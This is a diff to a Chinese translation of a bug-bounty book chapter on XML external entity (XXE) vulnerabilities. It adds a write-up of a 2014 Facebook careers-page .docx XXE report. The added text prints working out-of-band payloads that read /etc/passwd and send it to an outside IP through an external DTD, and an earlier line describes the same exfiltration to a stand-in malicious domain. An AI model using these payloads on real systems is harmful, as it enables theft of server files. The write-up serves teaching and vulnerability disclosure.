@@ -127,7 +127,7 @@ XML 實體像是一個訊息的占位符。再次使用我們之前的例子。�
 <foo>&callhome;</foo>
 ```
 
-在解釋它之前，你可能已經註意到我在`callhome` URL 中使用了`%`來代替`&`，`%xxe`。這是因為`%`用於實體在 DTD 定義內部被求值的情況，而`&`用於實體在 XML 文檔中被求值的情況。現在，當 XML 文檔被解析，`callhome !ENTITY`會讀取`/etc/passwd`的內容，並遠程調用`http://www.malicous.com`，將文件內容作為 URL 參數來發送，因為我們控制了該服務器，我們可以檢查我們的日誌，並且足夠確保擁有了`/etc/passwd`的內容。Web 應用的遊戲就結束了。
+在解釋它之前，你可能已經註意到我在`callhome` URL 中使用了`%`來代替`&`，`%xxe`。這是因為`%`用於實體在 DTD 定義內部被求值的情況，而`&`用於實體在 XML 文檔中被求值的情況。現在，當 XML 文檔被解析，`callhome !ENTITY`會讀取`/etc/passwd`的內容，並遠程呼叫`http://www.malicous.com`，將文件內容作為 URL 參數來發送，因為我們控制了該服務器，我們可以檢查我們的日誌，並且足夠確保擁有了`/etc/passwd`的內容。Web 應用的遊戲就結束了。
 
 所以，站點如何防範 XXE 漏洞？它們可以禁止解析任何外部實體。
 
@@ -168,5 +168,68 @@ Google 內部文件的 Detectify 截圖
 >大公司甚至都存在漏洞。雖然這個報告是兩年之前了，它仍然是一個大公司如何犯錯的極好的例子。
 >所需的 XML 可以輕易上傳到站點，站點使用了 XML 解析器。但是，有時站點不會產生響應，所以你需要測試來自 OWASP 速查表的其它輸入。
 
+---
+
+## **2. Facebook 單詞 XXE**
+```
+難度：難
+
+URL：facebook.com/careers
+
+報告連結：http://www.attack-secure.com/blog/hacked-facebook-word-document
+
+報告日期：2014.4
+
+獎金：$6300
+```
+
+描述：
+
+這個 XXE 有一些區別，並且比第一個例子更有挑戰，因為它涉及到遠程呼叫服務器，就像我們在描述中討論的那樣。
+<p>
+
+2013 年末，Facebook 修補了一個 XXE 漏洞，它可能會升級為遠程代碼執行漏洞，因為`/etc/passwd`文件的內容是可訪問的。獎金約為$30000。
+
+<p>
+
+因此，在 Mohamed 於 2014 年 4 月挑戰自己來滲透 Facebook 的時候，它不認為 XXE 可能存在，直到他發現它們的職位頁面允許用戶上傳`.docx`文件，它可以包含 XML。對於那些不知道的人，`.docx`文件只是個 XML 文件的壓縮包。所以，根據 Mohames，它創建了一個`.docx`文件，並使用 7zip 打開它來提取內容，並將下面的載荷插入了一個 XML 文件中。
+
+```xml
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">
+%dtd;
+%send;
+]]>
+```
 
 
+你會想到，在解析的時候，如果受害者開啟了外部實體，XML 解析器會呼叫遠程主機。要註意`!ENTITY`定義中和下面使用了`%`。這是因為這些占位符用在 DTD 自身中。在收到請求呼叫之後，遠程服務器會發送回 DTD 文件，像這樣：
+
+```xml
+<!ENTITY send SYSTEM 'http://197.37.102.90/?%26file;'>"
+```
+
+所以，回到文件中的載荷：
+
+1. 解析器會將`%dtd;`替換為獲取遠程 DTD 文件的呼叫。
+2. 解析器會將`%send;`替換為服務器的遠程呼叫，但是%`file;`會替換為`file:///etc/passwd`的內容。
+
+所以，Mohamed 使用 Python 和`SimpleHTTPServer`開啟了一台本地服務器，並等待接收：
+
+![1](https://raw.githubusercontent.com/dyeat/Document_read/master/Web_Hacking_101/image/14-2-1.jpg)
+
+Facebook 遠程呼叫的攻擊截圖
+<p>
+
+在報告之後，Facebook 發送了回覆，拒絕了這個報告，並說它們不能重現它，並請求內容的視頻驗證。在交換一些訊息之後，Facebook 提到招聘人員可能打開了文件，它會發送任意請求。Facebook 自傲組做了一些深入的挖掘，並給予了獎金，發送了一個郵件，解釋了這個 XXE 的影響比 2013 年初的要小，但是仍然是一個有效的利用，這裡是這個訊息。
+
+![2](https://raw.githubusercontent.com/dyeat/Document_read/master/Web_Hacking_101/image/14-2.jpg)
+
+Facebook 官方回覆
+>重要結論
+>
+>這裡有一些重要結論。XML 文件以不同形式和大小出現。要留意接受.`docx`、.`xlsx`、.`pptx`，以及其它的站點。向我之前提到過的那樣，
+>有時候你不會直接從 XXE >收到響應，這個示例展示了如何建立服務器來接受請求，它展示了 XXE。
+>
+>此外，像我們的例子中那樣，有時報告一開始會被拒絕。擁有訊息和耐心和你報告的公司周旋非常重要。尊重他們的決策，同時也解釋為什麽這可能是個漏洞。
